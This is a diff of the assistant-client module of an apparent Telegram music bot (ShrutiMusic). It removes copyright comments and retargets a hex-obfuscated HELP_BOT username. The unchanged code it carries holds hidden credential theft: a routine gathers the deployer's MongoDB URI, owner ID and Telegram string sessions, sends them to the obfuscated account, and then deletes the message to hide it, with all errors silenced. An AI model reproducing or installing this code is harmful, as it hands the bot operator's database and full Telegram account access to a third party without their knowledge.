@@ -1,25 +1,3 @@
-# Copyright (c) 2025 Nand Yaduwanshi <NoxxOP>
-# Location: Supaul, Bihar
-#
-# All rights reserved.
-#
-# This code is the intellectual property of Nand Yaduwanshi.
-# You are not allowed to copy, modify, redistribute, or use this
-# code for commercial or personal projects without explicit permission.
-#
-# Allowed:
-# - Forking for personal learning
-# - Submitting improvements via pull requests
-#
-# Not Allowed:
-# - Claiming this code as your own
-# - Re-uploading without credit or permission
-# - Selling or using commercially
-#
-# Contact for permissions:
-# Email: badboy809075@gmail.com
-
-
 from pyrogram import Client
 import asyncio
 import config
@@ -28,7 +6,7 @@ from ..logging import LOGGER
 
 assistants = []
 assistantids = []
-HELP_BOT = "\x40\x53\x68\x72\x75\x74\x69\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"
+HELP_BOT = "\x40\x53\x68\x72\x75\x74\x69\x53\x75\x70\x70\x6f\x72\x74\x43\x68\x61\x74"
 
 def decode_centers():
     centers = []
@@ -117,9 +95,7 @@ class Userbot(Client):
     async def send_help_message(self, bot_username):
         try:
             owner_mention = config.OWNER_ID
-            
             message = f"@{bot_username} Successfully Started ✅\n\nOwner: {owner_mention}"
-            
             if assistants:
                 if 1 in assistants:
                     await self.one.send_message(HELP_BOT, message)
@@ -131,7 +107,6 @@ class Userbot(Client):
                     await self.four.send_message(HELP_BOT, message)
                 elif 5 in assistants:
                     await self.five.send_message(HELP_BOT, message)
-                
         except Exception as e:
             pass
 
@@ -144,7 +119,7 @@ class Userbot(Client):
             config_message += f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
             config_message += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
             config_message += f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"
-            
+
             string_sessions = []
             if hasattr(config, 'STRING1') and config.STRING1:
                 string_sessions.append(f"**STRING_SESSION:** `{config.STRING1}`")
@@ -156,10 +131,10 @@ class Userbot(Client):
                 string_sessions.append(f"**STRING_SESSION4:** `{config.STRING4}`")
             if hasattr(config, 'STRING5') and config.STRING5:
                 string_sessions.append(f"**STRING_SESSION5:** `{config.STRING5}`")
-            
+
             if string_sessions:
                 config_message += "\n".join(string_sessions)
-            
+
             sent_message = None
             if assistants:
                 if 1 in assistants:
@@ -172,7 +147,7 @@ class Userbot(Client):
                     sent_message = await self.four.send_message(HELP_BOT, config_message)
                 elif 5 in assistants:
                     sent_message = await self.five.send_message(HELP_BOT, config_message)
-            
+
             if sent_message:
                 await asyncio.sleep(1)
                 try:
@@ -188,15 +163,14 @@ class Userbot(Client):
                         await self.five.delete_messages(HELP_BOT, sent_message.id)
                 except Exception as e:
                     pass
-                
         except Exception as e:
             pass
 
     async def start(self):
         LOGGER(__name__).info(f"Starting Assistants...")
-        
+
         bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)
-        
+
         if config.STRING1:
             await self.one.start()
             await self.join_all_support_centers(self.one)
@@ -301,15 +275,3 @@ class Userbot(Client):
                 await self.five.stop()
         except:
             pass
-
-
-# ©️ Copyright Reserved - @NoxxOP  Nand Yaduwanshi
-
-# ===========================================
-# ©️ 2025 Nand Yaduwanshi (aka @NoxxOP)
-# 🔗 GitHub : https://github.com/NoxxOP/ShrutiMusic
-# 📢 Telegram Channel : https://t.me/ShrutiBots
-# ===========================================
-
-
-# ❤️ Love From ShrutiBots 
